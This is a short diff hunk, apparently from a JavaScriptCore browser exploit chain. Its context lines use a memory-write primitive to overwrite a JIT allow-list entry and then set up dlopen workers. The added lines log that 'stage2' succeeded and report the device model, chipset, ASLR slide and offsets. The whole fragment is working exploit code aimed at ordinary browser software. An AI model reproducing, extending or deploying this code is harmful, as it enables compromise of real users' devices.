@@ -379,6 +379,11 @@ self[1] = boxed_arr;
           p.write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
           print("after write");
           self.postMessage({
+            type: 'log_exploit_stage',
+            stage: 'stage2_complete',
+            data: {status: 'success', device_model, chipset, slide: slide.toString(), offsets}
+          });
+          self.postMessage({
             type: 'prepare_dlopen_workers'
           });
         }
